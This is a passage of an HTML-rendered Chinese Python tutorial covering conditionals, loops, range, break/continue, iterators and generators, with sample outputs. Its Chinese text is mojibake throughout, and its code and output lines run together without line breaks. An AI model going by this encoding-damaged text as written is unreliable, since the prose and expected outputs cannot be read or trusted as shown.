class="token punctuation">(</span><span class="token string">"ç›¸å½“äº 14 å²çš„äººã€‚"</span><span class="token punctuation">)</span><span class="token keyword">elif</span> age <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ç›¸å½“äº 22 å²çš„äººã€‚"</span><span class="token punctuation">)</span><span class="token keyword">elif</span> age <span class="token operator">&gt;</span> <span class="token number">2</span><span class="token punctuation">:</span>    human <span class="token operator">=</span> <span class="token number">22</span> <span class="token operator">+</span> <span class="token punctuation">(</span>age <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">5</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"å¯¹åº”äººç±»å¹´é¾„: "</span><span class="token punctuation">,</span> human<span class="token punctuation">)</span><span class="token comment"># é€€å‡ºæç¤º</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"ç‚¹å‡» enter é”®é€€å‡º"</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''è¯·è¾“å…¥ä½ å®¶ç‹—ç‹—çš„å¹´é¾„: 3å¯¹åº”äººç±»å¹´é¾„:  27ç‚¹å‡» enter é”®é€€å‡º'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ifåµŒå¥—"><a href="#ifåµŒå¥—" class="headerlink" title="ifåµŒå¥—"></a>ifåµŒå¥—</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> è¡¨è¾¾å¼<span class="token number">1</span><span class="token punctuation">:</span>    è¯­å¥    <span class="token keyword">if</span> è¡¨è¾¾å¼<span class="token number">2</span><span class="token punctuation">:</span>        è¯­å¥    <span class="token keyword">elif</span> è¡¨è¾¾å¼<span class="token number">3</span><span class="token punctuation">:</span>        è¯­å¥    <span class="token keyword">else</span><span class="token punctuation">:</span>        è¯­å¥<span class="token keyword">elif</span> è¡¨è¾¾å¼<span class="token number">4</span><span class="token punctuation">:</span>    è¯­å¥<span class="token keyword">else</span><span class="token punctuation">:</span>    è¯­å¥num <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"è¾“å…¥ä¸€ä¸ªæ•°å­—ï¼š"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> num <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> num <span class="token operator">%</span> <span class="token number">3</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ä½ è¾“å…¥çš„æ•°å­—å¯ä»¥æ•´é™¤ 2 å’Œ 3"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ä½ è¾“å…¥çš„æ•°å­—å¯ä»¥æ•´é™¤ 2ï¼Œä½†ä¸èƒ½æ•´é™¤ 3"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> num <span class="token operator">%</span> <span class="token number">3</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ä½ è¾“å…¥çš„æ•°å­—å¯ä»¥æ•´é™¤ 3ï¼Œä½†ä¸èƒ½æ•´é™¤ 2"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ä½ è¾“å…¥çš„æ•°å­—ä¸èƒ½æ•´é™¤ 2 å’Œ 3"</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''è¾“å…¥ä¸€ä¸ªæ•°å­—ï¼š4ä½ è¾“å…¥çš„æ•°å­—å¯ä»¥æ•´é™¤ 2ï¼Œä½†ä¸èƒ½æ•´é™¤ 3'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="å¾ªç¯è¯­å¥"><a href="#å¾ªç¯è¯­å¥" class="headerlink" title="å¾ªç¯è¯­å¥"></a>å¾ªç¯è¯­å¥</h2><ol><li>pythonä¸­å¾ªç¯æœ‰forå’Œwhile</li><li>ç¼©è¿›å’Œå†’å·å’Œæ¡ä»¶æ§åˆ¶ç›¸ä¼¼</li></ol><h3 id="whileå¾ªç¯"><a href="#whileå¾ªç¯" class="headerlink" title="whileå¾ªç¯"></a>whileå¾ªç¯</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">while</span> åˆ¤æ–­æ¡ä»¶<span class="token punctuation">(</span>condition<span class="token punctuation">)</span>ï¼š    æ‰§è¡Œè¯­å¥<span class="token punctuation">(</span>statements<span class="token punctuation">)</span>â€¦â€¦    n <span class="token operator">=</span> <span class="token number">10</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token builtin">sum</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">:</span>    <span class="token builtin">sum</span> <span class="token operator">=</span> <span class="token builtin">sum</span> <span class="token operator">+</span> i    i <span class="token operator">+=</span><span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">sum</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''55'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ— é™å¾ªç¯"><a href="#æ— é™å¾ªç¯" class="headerlink" title="æ— é™å¾ªç¯"></a>æ— é™å¾ªç¯</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">while</span> <span class="token number">1</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'éšä¾¿è¾“å…¥ï¼Œè¾“å…¥0é€€å‡º'</span><span class="token punctuation">)</span>    var <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> var <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># break</span>                <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="while-else"><a href="#while-else" class="headerlink" title="while-else"></a>while-else</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">while</span> <span class="token operator">&lt;</span>expr<span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token operator">&lt;</span>statement<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token operator">&lt;</span>additional_statement<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">&gt;</span>    count <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> count <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token punctuation">(</span>count<span class="token punctuation">,</span> <span class="token string">" å°äº 5"</span><span class="token punctuation">)</span>   count <span class="token operator">=</span> count <span class="token operator">+</span> <span class="token number">1</span><span class="token keyword">else</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token punctuation">(</span>count<span class="token punctuation">,</span> <span class="token string">" å¤§äºæˆ–ç­‰äº 5"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="forè¯­å¥"><a href="#forè¯­å¥" class="headerlink" title="forè¯­å¥"></a>forè¯­å¥</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> <span class="token operator">&lt;</span>variable<span class="token operator">&gt;</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>sequence<span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token operator">&lt;</span>statements<span class="token operator">&gt;</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token operator">&lt;</span>statements<span class="token operator">&gt;</span>    sites <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"Baidu"</span><span class="token punctuation">,</span> <span class="token string">"Google"</span><span class="token punctuation">,</span> <span class="token string">"Runoob"</span><span class="token punctuation">,</span> <span class="token string">"Taobao"</span><span class="token punctuation">]</span><span class="token keyword">for</span> site <span class="token keyword">in</span> sites<span class="token punctuation">:</span>    <span class="token keyword">if</span> site <span class="token operator">==</span> <span class="token string">"Runoob"</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"èœé¸Ÿæ•™ç¨‹!"</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"å¾ªç¯æ•°æ® "</span> <span class="token operator">+</span> site<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"æ²¡æœ‰å¾ªç¯æ•°æ®!"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"å®Œæˆå¾ªç¯!"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="rangeå‡½æ•°"><a href="#rangeå‡½æ•°" class="headerlink" title="rangeå‡½æ•°"></a>rangeå‡½æ•°</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Google'</span><span class="token punctuation">,</span> <span class="token string">'Baidu'</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">,</span> <span class="token string">'QQ'</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''0125147-10-50-900 Google1 Baidu2 Runoob3 Taobao4 QQ[0, 1, 2, 3, 4]'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="breakå’Œcontinue"><a href="#breakå’Œcontinue" class="headerlink" title="breakå’Œcontinue"></a>breakå’Œcontinue</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">n <span class="token operator">=</span> <span class="token number">5</span><span class="token keyword">while</span> n <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">:</span>    n <span class="token operator">-=</span> <span class="token number">1</span>    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'å¾ªç¯ç»“æŸã€‚'</span><span class="token punctuation">)</span>n <span class="token operator">=</span> <span class="token number">5</span><span class="token keyword">while</span> n <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">:</span>    n <span class="token operator">-=</span> <span class="token number">1</span>    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'å¾ªç¯ç»“æŸã€‚'</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''43å¾ªç¯ç»“æŸã€‚4310å¾ªç¯ç»“æŸã€‚'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="for-else"><a href="#for-else" class="headerlink" title="for-else"></a>for-else</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> n <span class="token operator">%</span> x <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token string">'ç­‰äº'</span><span class="token punctuation">,</span> x<span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">,</span> n<span class="token operator">//</span>x<span class="token punctuation">)</span>            <span class="token keyword">break</span>  <span class="token comment"># ç›´æ¥è·³å‡ºç¬¬ä¸€ä¸ªå¾ªç¯ï¼Œä¸æ‰§è¡Œelse</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token comment"># å¾ªç¯ä¸­æ²¡æœ‰æ‰¾åˆ°å…ƒç´ </span>        <span class="token keyword">print</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token string">' æ˜¯è´¨æ•°'</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''2  æ˜¯è´¨æ•°3  æ˜¯è´¨æ•°4 ç­‰äº 2 * 25  æ˜¯è´¨æ•°6 ç­‰äº 2 * 37  æ˜¯è´¨æ•°8 ç­‰äº 2 * 49 ç­‰äº 3 * 3'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="passè¯­å¥"><a href="#passè¯­å¥" class="headerlink" title="passè¯­å¥"></a>passè¯­å¥</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> letter <span class="token keyword">in</span> <span class="token string">'Runoob'</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> letter <span class="token operator">==</span> <span class="token string">'o'</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'æ‰§è¡Œ pass å—'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'å½“å‰å­—æ¯ :'</span><span class="token punctuation">,</span> letter<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Good bye!"</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''å½“å‰å­—æ¯ : Rå½“å‰å­—æ¯ : uå½“å‰å­—æ¯ : næ‰§è¡Œ pass å—å½“å‰å­—æ¯ : oæ‰§è¡Œ pass å—å½“å‰å­—æ¯ : oå½“å‰å­—æ¯ : bGood bye!'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>pass ä¸åšä»»ä½•äº‹æƒ…ï¼Œä¸€èˆ¬ç”¨åšå ä½è¯­å¥</p><h2 id="è¿­ä»£å™¨å’Œç”Ÿæˆå™¨"><a href="#è¿­ä»£å™¨å’Œç”Ÿæˆå™¨" class="headerlink" title="è¿­ä»£å™¨å’Œç”Ÿæˆå™¨"></a>è¿­ä»£å™¨å’Œç”Ÿæˆå™¨</h2><h3 id="è¿­ä»£å™¨"><a href="#è¿­ä»£å™¨" class="headerlink" title="è¿­ä»£å™¨"></a>è¿­ä»£å™¨</h3><p>è¿­ä»£å™¨ä¸¤ä¸ªåŸºæœ¬å‡½æ•°<code>iter()</code> <code>next()</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">list</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span>it <span class="token operator">=</span> <span class="token builtin">iter</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span>  <span class="token comment"># åˆ›å»ºè¿­ä»£å™¨å¯¹è±¡</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">next</span><span class="token punctuation">(</span>it<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># è¾“å‡ºè¿­ä»£å™¨çš„ä¸‹ä¸€ä¸ªå…ƒç´ </span><span class="token comment"># 1</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">next</span><span class="token punctuation">(</span>it<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 2</span><span class="token builtin">list</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span>it <span class="token operator">=</span> <span class="token builtin">iter</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span>  <span class="token comment"># åˆ›å»ºè¿­ä»£å™¨å¯¹è±¡</span><span class="token keyword">for</span> x <span class="token keyword">in</span> it<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token comment"># 1 2 3 4</span>    <span class="token builtin">list</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span>it <span class="token operator">=</span> <span class="token builtin">iter</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span>  <span class="token comment"># åˆ›å»ºè¿­ä»£å™¨å¯¹è±¡</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">next</span><span class="token punctuation">(</span>it<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> StopIteration<span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''1234'''</span><span class="token triple-quoted-string string">'''121 2 3 4 1234'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="åˆ›å»ºä¸€ä¸ªè¿­ä»£å™¨"><a href="#åˆ›å»ºä¸€ä¸ªè¿­ä»£å™¨" class="headerlink" title="åˆ›å»ºä¸€ä¸ªè¿­ä»£å™¨"></a>åˆ›å»ºä¸€ä¸ªè¿­ä»£å™¨</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MyNumbers</span><span class="token punctuation">:</span>  <span class="token keyword">def</span> <span class="token function">__iter__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">return</span> self   <span class="token keyword">def</span> <span class="token function">__next__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    x <span class="token operator">=</span> self<span class="token punctuation">.</span>a    self<span class="token punctuation">.</span>a <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">return</span> x myclass <span class="token operator">=</span> MyNumbers<span class="token punctuation">(</span><span class="token punctuation">)</span>myiter <span class="token operator">=</span> <span class="token builtin">iter</span><span class="token punctuation">(</span>myclass<span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">next</span><span class="token punctuation">(</span>myiter<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">next</span><span class="token punctuation">(</span>myiter<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">next</span><span class="token punctuation">(</span>myiter<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">next</span><span class="token punctuation">(</span>myiter<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">next</span><span class="token punctuation">(</span>myiter<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''12345'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="StopIteration"><a href="#StopIteration" class="headerlink" title="StopIteration"></a>StopIteration</h3><p>StopIteration å¼‚å¸¸ç”¨äºæ ‡è¯†è¿­ä»£çš„å®Œæˆï¼Œé˜²æ­¢å‡ºç°æ— é™å¾ªç¯çš„æƒ…å†µ</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MyNumbers</span><span class="token punctuation">:</span>  <span class="token keyword">def</span> <span class="token function">__iter__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">return</span> self   <span class="token keyword">def</span> <span class="token function">__next__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> self<span class="token punctuation">.</span>a <span class="token operator">&lt;=</span> <span class="token number">20</span><span class="token punctuation">:</span>      x <span class="token operator">=</span> self<span class="token punctuation">.</span>a      self<span class="token punctuation">.</span>a <span class="token operator">+=</span> <span class="token number">1</span>      <span class="token keyword">return</span> x    <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token keyword">raise</span> StopIteration myclass <span class="token operator">=</span> MyNumbers<span class="token punctuation">(</span><span class="token punctuation">)</span>myiter <span class="token operator">=</span> <span class="token builtin">iter</span><span class="token punctuation">(</span>myclass<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> myiter<span class="token punctuation">:</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ç”Ÿæˆå™¨"><a href="#ç”Ÿæˆå™¨" class="headerlink" title="ç”Ÿæˆå™¨"></a>ç”Ÿæˆå™¨</h3><p>ä½¿ç”¨<code>yield()</code>å‡½æ•°</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">fibonacci</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># ç”Ÿæˆå™¨å‡½æ•° - æ–æ³¢é‚£å¥‘</span>    a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> counter <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>counter <span class="token operator">&gt;</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>             <span class="token keyword">return</span>        <span class="token keyword">yield</span> a        a<span class="token punctuation">,</span> b <span class="token operator">=</span> b<span class="token punctuation">,</span> a <span class="token operator">+</span> b        counter <span class="token operator">+=</span> <span class="token number">1</span>f <span class="token operator">=</span> fibonacci<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment"># f æ˜¯ä¸€ä¸ªè¿­ä»£å™¨ï¼Œç”±ç”Ÿæˆå™¨è¿”å›ç”Ÿæˆ</span> <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token builtin">next</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">" "</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> StopIteration<span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token triple-quoted-string string">'''0 1 1 2 3 5 8 13 21 34 55 '''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="å‡½æ•°-4"><a href="#å‡½æ•°-4" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h2><ol><li>å‡½æ•°ä»£ç å—ä»¥defå…³é”®å­—å¼€å¤´ï¼Œåšè¡—å‡½æ•°æ ‡è¯†ç¬¦åç§°å’Œåœ†æ‹¬å·()</li><li>ä¼ å…¥çš„å‚æ•°å’Œè‡ªå˜é‡æ”¾åœ¨åœ†æ‹¬å·å†…</li><li>å‡½æ•°å†…å®¹ä»¥å†’å·èµ·å§‹ï¼Œå¹¶ä¸”ç¼©è¿›</li><li>return [è¡¨è¾¾å¼] ç»“æŸå‡½æ•°å¹¶è¿”å›å€¼</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># è®¡ç®—é¢ç§¯å‡½æ•°</span><span class="token keyword">def</span> <span class="token function">area</span><span class="token punctuation">(</span>width<span class="token punctuation">,</span> height<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> width <span class="token operator">*</span> height <span class="token keyword">def</span> <span class="token function">print_welcome</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    